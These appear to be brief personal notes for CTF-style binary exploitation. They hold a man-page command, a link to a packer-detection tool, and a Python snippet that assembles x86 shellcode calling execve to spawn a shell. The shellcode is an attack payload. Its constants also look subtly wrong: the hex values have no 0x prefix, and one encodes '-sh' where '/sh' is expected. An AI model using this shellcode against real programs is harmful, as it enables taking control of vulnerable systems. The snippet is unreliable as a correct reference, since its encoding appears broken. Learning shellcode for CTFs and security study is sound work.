# note

## search

### man

```bash
man man
```

## tools

查壳：[Detect It Easy](https://github.com/horsicq/Detect-It-Easy)

## shellcode

### execve sh

```python
asm_code = '''
    push 68732d    /* 682f736800 */
    push 6e69622f
    xor edx, edx
    xor ecx, ecx
    mov ebx, esp
    mov eax, 0xb
    int 0x80
'''
shellcode = asm(asm_code)
```

